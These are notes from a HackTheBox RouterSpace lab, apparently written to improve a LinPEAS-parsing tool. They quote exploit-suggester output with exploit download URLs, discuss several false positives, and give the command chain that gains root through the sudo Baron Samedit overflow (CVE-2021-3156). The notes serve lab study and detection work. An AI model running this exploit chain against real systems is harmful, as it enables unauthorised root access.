# HTB RouterSpace: CVE-2021-3156 (sudo Baron Samedit heap overflow)

**Platform:** HackTheBox
**Machine:** RouterSpace
**Source:** https://0xdf.gitlab.io/2022/07/09/htb-routerspace.html
**Year:** 2022 (modern LinPEAS)
**Category:** sudo version-specific CVE (heap-based buffer overflow, NOT a
GTFOBins/NOPASSWD misconfig: this is a binary exploit against sudo itself)

## Context
`sudo -l` shows nothing exploitable directly, but LinPEAS's "Executing Linux
Exploit Suggester" flags the installed sudo version as vulnerable to
CVE-2021-3156. This is fundamentally different from sudo NOPASSWD detection:
it requires downloading/compiling a CVE-specific exploit binary, not a
GTFOBins one-liner.

## LinPEAS Output (verbatim, System Information + Exploit Suggester sections)
```
      Operative system
      https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 5.4.0-90-generic (buildd@lgw01-amd64-054) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.3 LTS
Release:        20.04
Codename:       focal

      Sudo version
      https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.31

      CVEs Check
Vulnerable to CVE-2021-3560
```

```
      Executing Linux Exploit Suggester
      https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
```

## IMPORTANT: False Positive Lessons From This Box
The writeup explicitly documents THREE suggested exploits that turned out to
be FALSE POSITIVES on the real box, despite LinPEAS/exploit-suggester flagging
them:

1. **CVE-2017-5618 (setuid screen)**: false positive: no SetUID screen binary
   actually present on the system, even though the suggester flagged the
   kernel/distro as vulnerable. **Lesson: exploit-suggester CVE tags are based
   on kernel/distro version probability, NOT on confirmed presence of the
   vulnerable binary. ReadPEAS should cross-check the CVE tag against actual
   binary presence (e.g. does the SUID section actually list `screen`?) before
   promoting to CRITICAL.**

2. **CVE-2021-4034 (PwnKit)**: false positive: pkexec exists but is NOT
   SetUID root (`-rwxr-xr-x`, not `-rwsr-xr-x`). PwnKit requires pkexec to be
   SUID root to work. **Lesson: ReadPEAS should verify pkexec's actual SUID
   bit in the SUID section before flagging PwnKit as exploitable, not just
   rely on the exploit-suggester's version-based guess.**

3. **CVE-2021-3560 (PolKit)**: false positive: the POC requires
   accountsservice + gnome-control-center to be installed, which they were
   not. **Lesson: some CVE POCs have environmental dependencies beyond just
   "vulnerable version": worth noting in the finding description as a caveat
   rather than presenting as guaranteed root.**

4. **CVE-2021-22555 (Netfilter)**: attempted, kernel module was loaded
   (prerequisite met), but exploit still failed in practice (exploit
   reliability issue, not a detection issue).

## The ACTUAL working exploit: CVE-2021-3156 (Baron Samedit)

### Verification command (safe, non-destructive check)
```
sudoedit -s Y
```
If this prompts for a password → vulnerable. If it prints usage/help →
patched.

### Exploit Chain (as executed)
```bash
git clone git@github.com:CptGibbon/CVE-2021-3156.git
scp -ri ~/keys/ed25519_gen CVE-2021-3156/ paul@routerspace.htb:/dev/shm/
```
On target:
```bash
cd /dev/shm/CVE-2021-3156
make
./exploit
```
Result:
```
# id
uid=0(root) gid=0(root) groups=0(root),1001(paul)
```

## Detection Pattern for ReadPEAS
- Grep "Executing Linux Exploit Suggester" section for the literal string
  `[CVE-2021-3156] sudo Baron Samedit` (either variant: both link to the
  same Qualys advisory but different exploit repos: blasty/CVE-2021-3156 vs
  worawit/CVE-2021-3156).
- Cross-reference with the "Sudo version" line (`Sudo version 1.8.31` here): sudo < 1.9.5p2 is generally vulnerable.
- Before marking CRITICAL, note in the finding: "Confirm with `sudoedit -s Y`: if it prompts for a password, proceed with the exploit; if it prints
  help text, this is patched despite the version match."
- Provide BOTH download URLs (blasty and worawit) as alternatives since one
  repo may build more reliably than the other depending on target libc.
